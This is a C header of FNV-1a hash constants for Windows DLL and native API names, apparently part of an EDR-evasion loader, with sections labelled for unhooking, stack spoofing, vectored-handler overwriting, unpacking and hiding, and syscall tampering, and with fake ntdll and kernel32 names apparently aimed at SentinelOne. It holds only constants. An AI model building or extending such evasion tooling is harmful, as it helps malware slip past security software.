#pragma once

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Modules

#define FNV1A_NTDLL									0xA62A3B3B
#define FNV1A_KERNEL32								0xA3E6F6C3
#define FNV1A_KERNELBASE							0xBD6D9917

#define FNV1A_WIN32U								0x36E1BF09

#define FNV1A_S1_FAKE_NTD1L							0x01E29A2E
#define FNV1A_S1_FAKE_KERN3l32						0x174647BD

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Required For S1VehOverWrite.c

#define FNV1A_RtlRemoveVectoredExceptionHandler     0x7C104610
#define FNV1A_RtlDeleteFunctionTable				0x052CD70A
#define FNV1A_RtlAddFunctionTable					0x38791528
#define FNV1A_RtlProtectHeap						0xE8864CC2

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Required For Unhooking.c

#define FNV1A_NtOpenSection							0x14858576
#define FNV1A_NtMapViewOfSection					0xCBC9E1AE
#define FNV1A_NtUnmapViewOfSection					0x53B808C5

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Required For StackSpoofing.c

#define FNV1A_NtWaitForSingleObject					0xB073C52E
#define FNV1A_NtContinue							0x057D39F6
#define FNV1A_NtOpenProcess							0x5EA49A38
#define FNV1A_NtOpenThread							0x6C58330B
#define FNV1A_NtReadVirtualMemory					0x6E2A0391
#define FNV1A_NtQueryVirtualMemory					0xBE4E761F
#define FNV1A_NtGetContextThread					0x65ECAF30
#define FNV1A_NtQueryInformationThread				0x0C06E4E1
#define FNV1A_NtQuerySystemInformation				0x7A43974A
#define FNV1A_RtlUserThreadStart					0x44A988CE

// --------------------------------------------------------------------------------

// Target Wait Function To Fetch Matching Thread Entries

#define FNV1A_WaitForSingleObjectEx              0xF8D32811

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Required For UnpackAndHide.c

// NtAPIs
#define FNV1A_LdrLoadDll							0x7B566B5F
#define FNV1A_NtAllocateVirtualMemory				0xCA67B978
#define FNV1A_NtProtectVirtualMemory				0xBD799926

// WinAPIs
#define FNV1A_RtlAddFunctionTable					0x38791528

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Whitelisted Dummy Ahh Syscalls - Used For Syscalls Tampering

#define FNV1A_NtDrawText							0x133C89C6
#define FNV1A_NtQueryDefaultUILanguage				0x6C67FFD2
#define FNV1A_NtGetCurrentProcessorNumber			0xB26227A7
#define FNV1A_NtOpenEventPair						0x0A5ED00D


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
